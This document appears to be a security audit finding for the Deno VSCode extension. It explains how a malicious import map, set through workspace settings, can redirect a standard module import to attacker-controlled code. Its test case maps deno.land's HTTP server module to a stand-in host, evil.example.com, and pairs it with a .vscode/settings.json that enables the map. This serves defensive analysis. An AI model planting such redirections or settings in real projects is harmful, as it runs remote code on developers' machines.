# Vulnerabilities

## 1. Import Map Redirection for Code Execution

### Description
The Deno VSCode extension allows developers to specify an import map via the `deno.importMap` configuration setting. If an attacker crafts a malicious project with a specially designed import map, they can redirect legitimate module imports to attacker-controlled code. When a developer opens the project with the Deno extension enabled, the malicious code will be executed.

The attack works as follows:
1. Attacker creates a project with a malicious import map that redirects a legitimate module to attacker-controlled code
2. Attacker convinces the developer to open the project in VSCode
3. When the developer enables Deno for the project, the extension will use the malicious import map
4. When importing the legitimate module, the attacker's code is executed instead

### Impact
This vulnerability can lead to arbitrary code execution in the context of the developer's VSCode instance. Depending on the permissions granted to Deno (which can be extensive if using `--allow-all`), the malicious code could access the file system, network, and potentially sensitive information on the developer's machine.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- The Deno extension is not enabled by default, requiring explicit opt-in for each workspace
- Documentation explicitly advises caution: "Import maps provide a way to 'relocate' modules based on their specifiers"
- VSCode's isolation of extensions provides some containment

### Missing Mitigations
- No validation mechanism to detect suspicious redirections in import maps
- No warning when an import map redirects to untrusted or unexpected domains
- No sandbox or restricted mode for working with untrusted projects

### Preconditions
- The developer must open a project containing a malicious import map
- The developer must enable the Deno extension for that project
- The developer's workflow must involve importing modules that are redirected by the import map

### Source Code Analysis
The extension handles import maps in multiple locations. In `client/src/commands.ts`, the import map is read from configuration and passed to the Deno language server:

```typescript
// In the startLanguageServer function
const importMap: string | undefined | null = config.get("importMap");
if (importMap?.trim()) {
  args.push("--import-map", importMap.trim());
}
```

Similarly, in `client/src/debug_config_provider.ts`, the import map is included in debug configurations:

```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  // ...
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  // ...
  return args;
}
```

The extension doesn't verify the content or safety of import maps - it passes them directly to the Deno language server. When the code is executed, the Deno runtime will follow the redirections specified in the import map, potentially loading and executing malicious code.

### Security Test Case
1. Create a malicious import map (`import_map.json`):
```json
{
  "imports": {
    "https://deno.land/std/http/server.ts": "https://evil.example.com/malicious_server.ts"
  }
}
```

2. Create a Deno script that imports the legitimate module:
```typescript
// main.ts
import { serve } from "https://deno.land/std/http/server.ts";
console.log("Server module loaded");
```

3. Configure the project with the malicious import map:
```json
// .vscode/settings.json
{
  "deno.enable": true,
  "deno.importMap": "./import_map.json"
}
```

4. When the developer opens this project with the Deno extension enabled, instead of loading the legitimate HTTP server module from deno.land, the extension will load the malicious module from evil.example.com, executing whatever code it contains.
